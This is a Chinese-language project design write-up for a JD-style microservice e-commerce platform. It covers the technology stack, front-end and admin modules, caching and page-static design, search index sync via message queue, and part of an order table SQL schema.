<h2 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h2><p>MongoDB 是一个开源的，高性能，无模式（或者说是模式自由），使用 C++ 语言编写的面向文档的数据库。正因为 MongoDB 是面向文档的，所以它可以管理类似 JSON 的文档集合。又因为数据可以被嵌套到复杂的体系中并保持可以查询可索引，这样一来，应用程序便可以以一种更加自然的方式来为数据建模。</p>
<p>Mongo 适合用于以下场景：</p>
<ul>
<li>网站数据：Mongo非常适合实时的插入，更新与查询，并具备网站实时数据存储所需的复制及高度伸缩性。</li>
<li>缓存：由于性能很高，Mongo也适合作为信息基础设施的缓存层。在系统重启之后，由Mongo搭建的持久化缓存层可以避免下层的数据源过载。</li>
<li>大尺寸，低价值的数据：使用传统的关系型数据库存储一些数据时可能会比较昂贵，在此之前，很多时候程序员往往会选择传统的文件进行存储。</li>
<li>高伸缩性的场景：Mongo非常适合由数十或数百台服务器组成的数据库。Mongo的路线图中已经包含对MapReduce引擎的内置支持。</li>
<li>用于对象及JSON数据的存储：Mongo的BSON数据格式非常适合文档化格式的存储及查询。</li>
</ul>
<h2 id="ElasticSearch"><a href="#ElasticSearch" class="headerlink" title="ElasticSearch"></a>ElasticSearch</h2><p><strong>Elasticsearch</strong>是一个非常强大的搜索引擎。它目前被广泛地使用于各个IT公司。Elasticsearch是由Elastic公司创建并开源维护的。它的开源代码位于 <a href="https://github.com/elastic/elasticsearch%E3%80%82">github.com&#x2F;elastic&#x2F;ela…</a> 同时，Elastic公司也拥有<a href="https://github.com/elastic/logstash">Logstash</a>及<a href="https://github.com/elastic/kibana">Kibana</a>开源项目。这个三个开源项目组合在一起，就形成了 <strong>ELK</strong> 软件栈。他们三个共同形成了一个强大的生态圈。简单地说，<strong>L</strong>ogstash负责数据的采集，处理（丰富数据，数据转型等），<strong>K</strong>ibana负责数据展，分析及管理。<strong>E</strong>lasticsearch处于最核心的位置，它可以帮我们对数据进行快速地搜索及分析。</p>
<h2 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h2><p>消息队列提供一个异步通信机制，消息的发送者不必一直等待到消息被成功处理才返回，而是立即返回。消息中间件负责处理网络通信，如果网络连接不可用，消息被暂存于队列当中，当网络畅通的时候在将消息转发给相应的应用程序或者服务，当然前提是这些服务订阅了该队列。如果在商品服务和订单服务之间使用消息中间件，既可以提高并发量，又降低服务之间的耦合度。</p>
<p>RabbitMQ就是这样一款我们苦苦追寻的消息队列。RabbitMQ是一个开源的消息代理的队列服务器，用来通过普通协议在完全不同的应用之间共享数据。</p>
<p>RabbitMQ是使用Erlang语言来编写的，并且RabbitMQ是基于AMQP协议的。Erlang语言在数据交互方面性能优秀，有着和原生Socket一样的延迟，这也是RabbitMQ高性能的原因所在。可谓“人如其名”，RabbitMQ像兔子一样迅速。</p>
<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>nginx是一个<strong>高性能的HTTP</strong>和<strong>反向代理服务器</strong>,其特点是占用内存少,并发能力强.</p>
<h2 id="Openresty"><a href="#Openresty" class="headerlink" title="Openresty"></a>Openresty</h2><p>OpenResty是一个基于 Nginx 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。</p>
<p>OpenResty通过汇聚各种设计精良的 Nginx 模块（主要由 OpenResty 团队自主开发），从而将 Nginx 有效地变成一个强大的通用 Web 应用平台。这样，Web 开发人员和系统工程师可以使用 Lua 脚本语言调动 Nginx 支持的各种 C 以及 Lua 模块，快速构造出足以胜任 10K 乃至 1000K 以上单机并发连接的高性能 Web 应用系统。</p>
<p>OpenResty的目标是让你的Web服务直接跑在 Nginx 服务内部，充分利用 Nginx 的非阻塞 I&#x2F;O 模型，不仅仅对 HTTP 客户端请求,甚至于对远程后端诸如 MySQL、PostgreSQL、Memcached 以及 Redis 等都进行一致的高性能响应。</p>
<h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>JSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。 该信息可以被验证和信任，因为它是数字签名的。</p>
<h2 id="Canal"><a href="#Canal" class="headerlink" title="Canal"></a>Canal</h2><p> Canal是阿里巴巴旗下的一款开源项目，纯Java开发。 基于数据库增量日志解析，提供增量数据订阅&amp;消费，目前主要支持了MySQL（也支持mariaDB）。</p>
<h2 id="Seata"><a href="#Seata" class="headerlink" title="Seata"></a>Seata</h2><p>Seata 是一款开源的分布式事务解决方案，致力于提供高性能和简单易用的分布式事务服务。Seata 将为用户提供了 AT、TCC、SAGA 和 XA 事务模式，为用户打造一站式的分布式解决方案。</p>
<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>Docker 是一个开放源代码软件项目，项目主要代码在2013年开源于 <a href="https://github.com/moby/moby">GitHub</a>。它是云服务技术上的一次创新，让应用程序布署在软件容器下的工作可以自动化进行，借此在 Linux 操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。</p>
<p>Docker 利用 Linux 核心中的资源分脱机制，例如 cgroups，以及 Linux 核心名字空间（name space），来创建独立的软件容器（containers），属于操作系统层面的虚拟化技术。由于隔离的进程独立于宿主和其它的隔离的进程，因此也称其为容器。Docker 在容器的基础上进行了进一步的封装，从文件系统、网络互联到进程隔离等等，极大的简化了容器的创建和维护，使得其比虚拟机技术更为轻便、快捷。Docker 可以在单一 Linux 实体下运作，避免因为创建一个虚拟机而造成的额外负担。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120457.png" alt="截屏2021-07-03 上午9.41.39"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120458.png" alt="截屏2021-07-03 上午9.41.47"></p>
<h2 id="GrayLog"><a href="#GrayLog" class="headerlink" title="GrayLog"></a>GrayLog</h2><p><strong>Enterprise Log Management for All</strong>。<br>一个具有报警选项的可插入日志和事件分析服务器。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120459.png" alt="截屏2021-07-03 上午9.47.48"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120460.png" alt="截屏2021-07-03 上午9.48.00"></p>
<h2 id="Skywalking"><a href="#Skywalking" class="headerlink" title="Skywalking"></a>Skywalking</h2><p>SkyWalking是分布式系统的应用程序性能监视工具，专为微服务、云原生架构和基于容器（Docker、K8S、Mesos）架构而设计</p>
<p>SkyWalking是观察性分析平台和应用性能管理系统。提供分布式追踪、服务网格遥测分析、度量聚合和可视化一体化解决方案</p>
<p>SkyWalking是一个开源APM系统，包括对Cloud Native体系结构中的分布式系统的监视，跟踪，诊断功能。 核心功能如下。</p>
<ul>
<li>服务，服务实例，端点指标分析</li>
<li>根本原因分析</li>
<li>服务拓扑图分析</li>
<li>服务，服务实例和端点依赖关系分析</li>
<li>检测到慢速服务和端点</li>
<li>性能优化</li>
<li>分布式跟踪和上下文传播</li>
<li>数据库访问指标。 检测慢速数据库访问语句（包括SQL语句）。</li>
<li>报警</li>
</ul>
<p>SkyWalking支持从多种来源和多种格式收集遥测（跟踪和度量）数据，包括</p>
<ul>
<li>SkyWalking格式的Java，.NET Core，NodeJS和PHP自动仪器代理</li>
<li>SkyWalking格式的手动仪器Go代理。</li>
<li>Istio遥测格式</li>
<li>由Istio控制的服务网格中的Envoy gRPC访问日志服务（ALS）格式</li>
<li>特使指标服务格式。</li>
<li>Zipkin v1 &#x2F; v2格式。</li>
<li>Jaeger gRPC格式。</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120461.png" alt="image-20210703095106687"></p>
<h2 id="Vue-js"><a href="#Vue-js" class="headerlink" title="Vue.js"></a>Vue.js</h2><p>Vue.js是一套用于构建用户界面的渐进式框架。与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。Vue拥有比react更简单好用的双向数据绑定。</p>
<h2 id="Vue-CLI-脚手架"><a href="#Vue-CLI-脚手架" class="headerlink" title="Vue CLI 脚手架"></a>Vue CLI 脚手架</h2><p>Vue CLI 脚手架可以快速生成前端项目的文件配置，其致力于将 Vue 生态中的工具基础标准化，这样开发者可以专注在撰写应用上，而不必花时间去纠结配置的问题。与此同时，它也为每个工具提供了调整配置的灵活性。</p>
<h2 id="element-UI-Vant-组件库"><a href="#element-UI-Vant-组件库" class="headerlink" title="element-UI + Vant 组件库"></a>element-UI + Vant 组件库</h2><p>  由于前端开发的模块化、组件化的兴起，导致了很多开源组件库的产生。组件库就是一套为开发者、设计师和产品经理准备的基于 Vue 或 react 的桌面端组件的集合，它可以大大加快程序员的开发效率。</p>
<h2 id="Axios"><a href="#Axios" class="headerlink" title="Axios"></a>Axios</h2><p>基于promise用于浏览器和node.js的http客户端，axios 是对 ajax 技术的封装，主要是前端用来与服务器进行数据交换使用。</p>
<h2 id="Vue-Router"><a href="#Vue-Router" class="headerlink" title="Vue Router"></a>Vue Router</h2><p>Vue Router 是 <a href="http://cn.vuejs.org/">Vue.js </a>官方的路由管理器。通过Vue Router 在路由器配置中建立组件与路由路径的一一对应，并通过路由器监听器监听路由路径的改变，以此达到切换组件的功能。</p>
<h2 id="Vuex"><a href="#Vuex" class="headerlink" title="Vuex"></a>Vuex</h2><p>Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。Vuex 也集成到 Vue 的官方调试工具 <a href="https://github.com/vuejs/vue-devtools">devtools extension </a>，提供了诸如零配置的 time-travel 调试、状态快照导入导出等高级调试功能。</p>
<h1 id="三、需求分析"><a href="#三、需求分析" class="headerlink" title="三、需求分析"></a>三、需求分析</h1><p>类京东的电商平台是一个典型的B2C（Business to Customer）类型的电子商务平台。既要面向用户，又要面向管理员。就面向用户而言，系统应实现注册、登陆、浏览商品、搜索商品、产生订单，查看订单，查看个人信息等功能；就面向管理员而言，系统应实现商品管理、会员管理、销售管理和权限管理等功能。虽然刚开始的并发量不大，但是考虑到以后的业务扩展以及用户数的激增，我们选择采用微服务架构才搭建该项目，在微服务架构下，我们需要解决分布式事务问题，以及设计分布式锁，确保整个平台安全可靠的运行，不会出现库存超卖等情况。</p>
<h1 id="四、项目主要模块设计"><a href="#四、项目主要模块设计" class="headerlink" title="四、项目主要模块设计"></a>四、项目主要模块设计</h1><h2 id="项目总体结构设计"><a href="#项目总体结构设计" class="headerlink" title="项目总体结构设计"></a>项目总体结构设计</h2><p>本项目可分为前端应用和后台服务三大模块。</p>
<ul>
<li><p>前端应用可分为基于H5的前台门户服务和基于SPA的后台管理页面，前台门户服务主要用来和用户交互，用户浏览商品，购买商品等等，后台管理页面主要用来和管理员交互，主要可以进行商品管理、会员管理、销售管理和权限管理。</p>
</li>
<li><p>后台服务可分为接入层，网关层，服务层，基础服务和数据层</p>
</li>
</ul>
<p>业务架构设计如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120462.png" alt="image-20210703154549744"></p>
<p>项目技术架构设计如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120464.png" alt="image-20210703153352619"></p>
<p>类图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120465.png" alt="image-20210704195748193"></p>
<h2 id="前台应用详细设计"><a href="#前台应用详细设计" class="headerlink" title="前台应用详细设计"></a>前台应用详细设计</h2><h3 id="前台门户服务"><a href="#前台门户服务" class="headerlink" title="前台门户服务"></a>前台门户服务</h3><h4 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈:"></a>技术栈:</h4><p>Vue框架 + ElementUI + Vant + axios + VueRouter路由 + Vue CLI脚手架</p>
<h4 id="项目功能模块"><a href="#项目功能模块" class="headerlink" title="项目功能模块"></a>项目功能模块</h4><p>登录与注册功能</p>
<p>①页面使用了element-ui的Dialog组件实现弹出对话框的效果，登录按钮设置在App.vue根组件，通过vuex中的showLogin状态控制登录框是否显示。</p>
<p>②当用户登录失败(用户输入的账号不存在)，提示用户先进行注册账号，并切换登录组件为注册组件。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120466.jpg" alt="img"> </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120467.jpg" alt="img"> </p>
<h4 id="首页展示"><a href="#首页展示" class="headerlink" title="首页展示"></a>首页展示</h4><p>①首页主要是对商品的展示，有轮播图展示推荐的商品，分类别对热门商品进行展示。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120468.jpg" alt="img"> </p>
<h4 id="账号管理–待发货"><a href="#账号管理–待发货" class="headerlink" title="账号管理–待发货"></a>账号管理–待发货</h4><p>①通过服务器发来的订单数据，并通过判断isSend字段判断订单是否发货，将未发货订单全部放入一个数组中并将订单(图片、标题、价格、时间)渲染到组件上。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120469.jpg" alt="img"> </p>
<h4 id="账号管理–我的收藏"><a href="#账号管理–我的收藏" class="headerlink" title="账号管理–我的收藏"></a>账号管理–我的收藏</h4><p>①将服务器传来的用户收藏商品数据保存在数组中，并通过V-for 循环渲染在收藏组件中。</p>
<p>②效果图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120470.jpg" alt="img"> </p>
<h4 id="个人信息–地址管理"><a href="#个人信息–地址管理" class="headerlink" title="个人信息–地址管理"></a>个人信息–地址管理</h4><p>①将服务器传来的用户已有地址数据循环渲染出来，并增加一个 添加新地址功能，当用户添加新地址后，前端将新添加的数据对象通过axios 请求发送给服务器保存起来。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120471.jpg" alt="img"> </p>
<h4 id="热门推荐：将用户可能喜欢的产品展示在用户推荐列表中"><a href="#热门推荐：将用户可能喜欢的产品展示在用户推荐列表中" class="headerlink" title="热门推荐：将用户可能喜欢的产品展示在用户推荐列表中"></a>热门推荐：将用户可能喜欢的产品展示在用户推荐列表中</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120472.jpg" alt="img"></p>
<h3 id="管理员页面服务"><a href="#管理员页面服务" class="headerlink" title="管理员页面服务"></a>管理员页面服务</h3><h4 id="管理员页面服务采用前后端分离开发，主要完成的功能有："><a href="#管理员页面服务采用前后端分离开发，主要完成的功能有：" class="headerlink" title="管理员页面服务采用前后端分离开发，主要完成的功能有："></a>管理员页面服务采用前后端分离开发，主要完成的功能有：</h4><ul>
<li><p>登录功能页面</p>
</li>
<li><p>商品管理：包括商品分类管理，品牌管理，商品列表、商品规格信息管理</p>
</li>
<li><p>销售管理：包括交易统计、订单管理、物流管理、促销管理。</p>
</li>
<li><p>会员管理：包括会员统计、会员管理。</p>
</li>
<li><p>权限管理：包括权限管理、角色管理、人员管理、服务管理。</p>
</li>
</ul>
<h4 id="电商后台管理系统是基于Vue-技术栈的-SPA-单页面应用项目，共-15-个具有交互功能的页面。"><a href="#电商后台管理系统是基于Vue-技术栈的-SPA-单页面应用项目，共-15-个具有交互功能的页面。" class="headerlink" title="电商后台管理系统是基于Vue 技术栈的 SPA 单页面应用项目，共 15 个具有交互功能的页面。"></a>电商后台管理系统是基于Vue 技术栈的 SPA 单页面应用项目，共 15 个具有交互功能的页面。</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120473.jpg" alt="img"></p>
<h4 id="主要技术栈"><a href="#主要技术栈" class="headerlink" title="主要技术栈"></a>主要技术栈</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120474.png" alt="image-20210704200044327"></p>
<h4 id="登陆功能"><a href="#登陆功能" class="headerlink" title="登陆功能"></a>登陆功能</h4><p>登录业务流程</p>
<ul>
<li><p>在登录页面输入用户名和密码 </p>
</li>
<li><p>调用后台接口进行验证 </p>
</li>
<li><p>通过验证之后，根据后台的响应状态(200)跳转到项目主页</p>
</li>
</ul>
<h4 id="商品管理功能"><a href="#商品管理功能" class="headerlink" title="商品管理功能"></a>商品管理功能</h4><p>在 VueRouter 路由器文件中进行 路由与组件的对应配置。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120475.png" alt="image-20210704200246538"></p>
<p>通过VueRouter路由监听器监听页面中路由的改变，当路由(通过点击文字链接)发生改变，则地址栏中URL发生相应变化，并切换不同的组件展示在页面中。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120476.jpg" alt="img"> </p>
<h4 id="会员管理功能"><a href="#会员管理功能" class="headerlink" title="会员管理功能"></a>会员管理功能</h4><p>(1)统计商城所有会员的来源地以及数量，方便商城进行会员的新增计划。</p>
<p>(2)使用 elementUI 组件库编写页面组件，并具有编辑会员信息和分页功能。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120477.jpg" alt="img"> </p>
<h4 id="销售管理功能"><a href="#销售管理功能" class="headerlink" title="销售管理功能"></a>销售管理功能</h4><p>(1)通过接收后台传来的数据统计商城某段时间的订单来源、订单金额、订单物流状态、商城促销活动的启动与结束。</p>
<p>(2)引入了第三方专业绘图库 Echarts，它是基于 javascript 的实现的开源可视化库。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120478.png" alt="image-20210704200350674"></p>
<h4 id="权限管理功能"><a href="#权限管理功能" class="headerlink" title="权限管理功能"></a>权限管理功能</h4><p>(1)通过权限管理模块控制不同的用户可以进行哪些操作，具体可以通过角色的方式进行控制，即每个用户分配 一个特定的角色，角色包括不同的功能权限。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120479.jpg" alt="img"> </p>
<p>(2)使用组件库进行开发，并有编辑、删除、分页等功能。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120480.jpg" alt="img"> </p>
<h2 id="后台服务详细设计"><a href="#后台服务详细设计" class="headerlink" title="后台服务详细设计"></a>后台服务详细设计</h2><h3 id="接入层"><a href="#接入层" class="headerlink" title="接入层"></a>接入层</h3><p>接入层使用nginx做反向代理</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120481.png" alt="image-20210703145712990"></p>
<p>目前是一个微服务，如果访问量过大，服务器扛不住可以做集群：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120482.png" alt="image-20210703150649717"></p>
<h3 id="注册中心"><a href="#注册中心" class="headerlink" title="注册中心"></a>注册中心</h3><p>注册中心采用Eureka，Eureka满足CAP定理里的CA，Zookeeper满足CP，相比于Zookeeper，Eureka更在意服务的可用性，对于商城项目，我们也很在意服务的可用性，而对集群之间的一致性要求不是很苛刻，即使某个服务已经宕机，而Eureka没有及时更新也不影响，其他服务访问不到做服务降级，然后再请求另一台服务即可。因此，本项目注册中心选择Eureka。</p>
<h3 id="网关层"><a href="#网关层" class="headerlink" title="网关层"></a>网关层</h3><p>网关层使用Spring Cloud gateway，该层需要配合注册中心进行服务拉取，该层使用ribbon做负载均衡，使用hystrix做服务降级，以及需要实现请求限流，权限控制，解决CROS跨域问题。</p>
<p>请求限流的设计方案一流程图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120483.png" alt="image-20210703125828774"></p>
<p>请求限流的设计方案二流程图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120484.png" alt="image-20210703125935895"></p>
<h3 id="服务层"><a href="#服务层" class="headerlink" title="服务层"></a>服务层</h3><h4 id="用户微服务（ly-user-service）"><a href="#用户微服务（ly-user-service）" class="headerlink" title="用户微服务（ly-user-service）"></a>用户微服务（ly-user-service）</h4><p>地址管理</p>
<p>用户管理</p>
<h4 id="商品微服务-ly-item-service"><a href="#商品微服务-ly-item-service" class="headerlink" title="商品微服务(ly-item-service)"></a>商品微服务(ly-item-service)</h4><p>品牌管理</p>
<p>分类管理</p>
<p>商品管理</p>
<p>规格管理</p>
<h4 id="商品详情页微服务-ly-page"><a href="#商品详情页微服务-ly-page" class="headerlink" title="商品详情页微服务(ly-page)"></a>商品详情页微服务(ly-page)</h4><p>用户搜索到商品后，就会点击商品，查看商品详情内容，就会访问到商品详情页。商品详情页是展示商品详细信息的一个页面，承载在网站的大部分流量和订单的入口。</p>
<p>因此，商品详情页必须能够应对高并发的压力。</p>
<h5 id="设计思路一：传统方案"><a href="#设计思路一：传统方案" class="headerlink" title="设计思路一：传统方案"></a>设计思路一：传统方案</h5><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120485.png" alt="image-20210704021148458"></p>
<p>基本流程如下：</p>
<ul>
<li>用户请求nginx服务，获取到静态页面</li>
<li>然后页面发起Nginx，向Tomcat服务获取数据</li>
<li>Tomcat查询数据库</li>
<li>页面渲染</li>
</ul>
<p>这种方案下，数据库成了瓶颈，高并发情况下，数据难以支撑。</p>
<h5 id="设计思路二：加入缓存"><a href="#设计思路二：加入缓存" class="headerlink" title="设计思路二：加入缓存"></a>设计思路二：加入缓存</h5><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120486.png" alt="image-20210704021449739"></p>
<p>这种方案下，整个服务的并发能力，就受限于Tomcat，业务经常受到依赖的服务不稳定而导致的性能抖动。</p>
<h5 id="设计思路三：页面静态化"><a href="#设计思路三：页面静态化" class="headerlink" title="设计思路三：页面静态化"></a>设计思路三：页面静态化</h5><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120487.png" alt="image-20210704021647900"></p>
<p>基本流程：</p>
<ul>
<li>商品修改发送消息到MQ</li>
<li>微服务监听MQ，得知商品变化，渲染并生成一个静态页面</li>
<li>用户请求Nginx</li>
<li>Nginx直接返回渲染好的静态Html</li>
</ul>
<p>优点：</p>
<ul>
<li>用户请求渲染好的Html，响应速度快</li>
<li>通过MQ异步更新，保证数据同步</li>
</ul>
<p>缺点：</p>
<ul>
<li>小部分数据如价格变更，整个静态页都要重新生成</li>
<li>随着商品数量增加，页面会越来越多</li>
<li>页面模板变更，所有商品的静态页都要重新生成，非常困难</li>
</ul>
<h5 id="设计方案四：动态模版，静态化数据"><a href="#设计方案四：动态模版，静态化数据" class="headerlink" title="设计方案四：动态模版，静态化数据"></a>设计方案四：动态模版，静态化数据</h5><p>流程图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120488.png" alt="image-20210704022129626"></p>
<p>首先，把页面分成几部分：如顶部面包屑、商品SKU展示、商品描述、商品评论等，形成多个页面模板（模块）。对应的数据也分成几部分，这些数据可能来自不同的微服务。这样可以减少因局部变更引起的整个页面重新生成。</p>
<p>将页面模板存储到Nginx中，当用户请求某个页面时，我们在Nginx中渲染模板，把渲染好的模板组合在一起，形成完整页面，返回到用户。</p>
<p>Nginx渲染页面时，需要的数据可以缓存在Nginx的本地共享词典中（长期不会修改的数据），如果命中则直接渲染并返回。如果未命中，则查询Redis集群，获取数据。如果Redis集群依然未命中，再去查询后台微服务，由微服务获取数据，然后写入缓存中，保证下次Nginx可以从缓存中拿到数据。这样可以减少服务端压力。</p>
<p>另外，为了保证Redis数据与数据库数据一致，这里使用Canal技术，监听数据库变化，及时更新Redis数据。</p>
<h4 id="搜索微服务-ly-search"><a href="#搜索微服务-ly-search" class="headerlink" title="搜索微服务(ly-search)"></a>搜索微服务(ly-search)</h4><p>提供搜索服务，搜索框补齐，得解决数据同步问题，搜索功能依赖的商品数据是存储在ElasticSearch中的，但是数据库中也有一份商品数据。当我们对商品做增、删、改这样的操作时，ElasticSearch并未感知到，此时就会出现<strong>数据库数据与索引库数据的不一致</strong>。</p>
<p>不过，我们并不需要在商品增、删、改的时候都对索引库做处理，因为索引库中只需要上架的商品，如果一个商品新增了，并不代表也上架了。而且，商品要修改和删除前必须先下架，商品新增后还要上架。</p>
<p>所以，我们需要做的是：</p>
<ul>
<li>商品上架：在索引库新增数据</li>
<li>商品下架：把数据从索引库删除</li>
</ul>
<p>但商品的上架和下架时商品微服务<code>ly-item</code>中处理的，索引库数据是在<code>ly-search</code>中处理的。我们如何在上架时修改索引库呢？</p>
<p>主要有两种设计方案：</p>
<ul>
<li><p>方案1：在商品微服务的上下架业务后，加入修改索引库数据</p>
</li>
<li><p>方案2：搜索服务对外提供操作索引库，商品微服务在商品上下架后，调用接口。</p>
</li>
</ul>
<p>但是以上两种方式都有同一个严重问题：就是代码耦合，后台服务中需要嵌入搜索和商品页面服务，违背了微服务的独立原则，而且严重违背了开闭原则。</p>
<p>所以在这个地方我们采用消息队列来解决这个问题。</p>
<p>流程图如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120489.png" alt="image-20210704015047660"></p>
<p>商品微服务在完成上架、下架后，发送消息到MQ，通知是哪个商品更新了，自己的业务就结束了，商品微服务不需要知道，也不关心到底是谁在监听这条消息。</p>
<p>搜索微服务在接收到消息后，更新索引库数据即可，同样不需要关心别人。</p>
<p>两个微服务之间没有直接调用，没有业务的耦合。</p>
<h4 id="交易微服务-ly-trade"><a href="#交易微服务-ly-trade" class="headerlink" title="交易微服务(ly-trade)"></a>交易微服务(ly-trade)</h4><p>完成存入购物车以及下单功能，只要难点在于分布式事务，分布式锁，以及如何获取登陆用户信息，如何将用户信息与当前请求线程绑定；</p>
<h5 id="获取用户思路分析"><a href="#获取用户思路分析" class="headerlink" title="获取用户思路分析"></a>获取用户思路分析</h5><p>在请求进入交易服务时就获取用户信息，并且将当前用户信息与当前请求线程绑定。</p>
<h6 id="设计方案一：页面直接把用户作为请求参数传递"><a href="#设计方案一：页面直接把用户作为请求参数传递" class="headerlink" title="设计方案一：页面直接把用户作为请求参数传递"></a>设计方案一：页面直接把用户作为请求参数传递</h6><ul>
<li>优点：简单、方便、代码量为0</li>
<li>缺点：不安全，因为调用购物车CRUD的请求时从页面发过来的，不能确定这个传递的参数id是不是用户真实的id。</li>
</ul>
<h6 id="设计方案二：自己从cookie的token中解析用户信息"><a href="#设计方案二：自己从cookie的token中解析用户信息" class="headerlink" title="设计方案二：自己从cookie的token中解析用户信息"></a>设计方案二：自己从cookie的token中解析用户信息</h6><ul>
<li>优点：安全</li>
<li>缺点：需要重复检验jwt，网关层已经做过了；代码还很麻烦</li>
</ul>
<p>当获取用户信息后，我们需要把用户保存起来，方便后面的业务使用。</p>
<p>每次请求都有不同的用户信息，在并发请求情况下，必须保证每次请求保存的用户信息互不干扰，线程独立。可以使用ThreadLocal把<strong>用户与每一个请求线程绑定</strong>。</p>
<h4 id="订单数据结构设计"><a href="#订单数据结构设计" class="headerlink" title="订单数据结构设计"></a>订单数据结构设计</h4><p>采用数据库垂直拆分方式：</p>
<p>订单表：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `tb_order` (</span><br><span class="line">  `order_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;订单id&#x27;</span>,</span><br><span class="line">  `total_fee` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;总金额，单位为分&#x27;</span>,</span><br><span class="line">  `actual_fee` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;实付金额。单位:分。如:20007，表示:200元7分&#x27;</span>,</span><br><span class="line">  `payment_type` tinyint(<span class="number">2</span>) unsigned zerofill <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;支付类型，1、微信支付，2、支付宝支付&#x27;</span>,</span><br><span class="line">  `post_fee` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;邮费。单位:分。如:20007，表示:200元7分&#x27;</span>,</span><br><span class="line">  `user_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;用户id&#x27;</span>,</span><br><span class="line">  `status` tinyint(<span class="number">2</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;订单的状态，1、未付款 2、已付款,未发货 3、已发货,未确认 4、确认收货，交易成功 5、交易取消，订单关闭 6、交易结束，已评价&#x27;</span>,</span><br><span class="line">  `create_time` <span class="type">timestamp</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">  `pay_time` <span class="type">timestamp</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;支付时间&#x27;</span>,</span><br><span class="line">  `consign_time` <span class="type">timestamp</span> <span class="keyword">NULL</span> <span 